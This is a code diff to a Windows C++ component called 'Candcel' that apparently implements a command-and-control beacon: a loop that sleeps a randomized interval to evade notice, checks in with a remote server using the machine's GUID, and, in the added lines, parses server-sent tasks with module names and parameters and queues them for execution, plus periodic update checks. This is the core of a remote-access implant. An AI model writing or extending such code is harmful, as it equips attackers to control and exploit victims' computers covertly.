@@ -3,6 +3,7 @@
 #include "Config.h"
 #include "Process.h"
 #include "RestClient.h"
+#include "TaskQueue.h"
 #include "TransferClient.h"
 #include "Json.h"
 #include "Candcel.h"
@@ -70,10 +71,11 @@ bool Candcel::IsAlive()
 DWORD Candcel::CheckIn()
 {
 	while (true) {
-		int nextInterval = (rand() % (10 + 1)) + 5;
+		int nextInterval = (rand() % (CHECKIN_PACE + 1));
 
 		/* Randomize the interval for obvious reasons */
 		Sleep(nextInterval * 60 * 1000);
+		//Sleep(nextInterval * 60);
 
 		if (!serverSolicitAck) {
 			Solicit();
@@ -85,28 +87,67 @@ DWORD Candcel::CheckIn()
 
 		Log::Info(L"Candcel", L"Sending checkin request");
 
+#ifdef DEBUG
+		LARGE_INTEGER frequency;
+		LARGE_INTEGER t1, t2;
+		int elapsedTime;
+
+		QueryPerformanceFrequency(&frequency);
+		QueryPerformanceCounter(&t1);
+#endif
+
 		RestClient rc(Config::Current()->AvcHost(), Config::Current()->AvcUri());
 
 		JSONObject obj;
 		obj[L"guid"] = new JSONValue(Config::Current()->Guid());
 
-		rc.Call(RestClientCommand::CM_CLIENT_CHECKIN, new JSONValue(obj));
+		JSONValue *returnObj = rc.Call(RestClientCommand::CM_CLIENT_CHECKIN, new JSONValue(obj));
 
 		if (rc.getServerCode() != RestServerCommand::CM_SERVER_ACK) {
 			Log::Error(L"Candcel", L"Request failed");
 		}
 
-		//TODO: check for tasks
+#ifdef DEBUG
+		QueryPerformanceCounter(&t2);
+		elapsedTime = (int)((t2.QuadPart - t1.QuadPart) * 1000 / frequency.QuadPart);
+#endif
+
+		Log::Info(L"Candcel", L"Remote at " + std::to_wstring(elapsedTime) + L"ms");
+
+		/* Check for tasks */
+		if (returnObj) {
+			if (returnObj->IsObject()) {
+				if (returnObj->HasChild(L"task")) {
+					std::wstring mod = returnObj->Child(L"mod")->AsString();
+					
+					Task task(mod);
+
+					if (returnObj->HasChild(L"param")) {
+						for (auto const& param : returnObj->Child(L"param")->AsObject()) {
+
+							if (param.second->IsArray() || param.second->IsObject()) {
+								continue;
+							}
+
+							task.params[param.first] = param.second->Stringify();
+						}
+					}
+
+					/* Put task on queue */
+					TaskQueue::Current()->Add(task);
+				}
+			}
+		}
 
 		checkInCount++;
 
-		// Solicit about every two hours
+		/* Solicit about every two hours */
 		if (checkInCount % 8 == 0) {
 			Solicit();
 		}
 
-		// Check for updates after about a day
-		if (checkInCount > 100) {
+		/* Check for updates after about a day */
+		if (checkInCount > SOLICIT_PACE) {
 			CheckForUpdate();
 			checkInCount = 0;
 		}
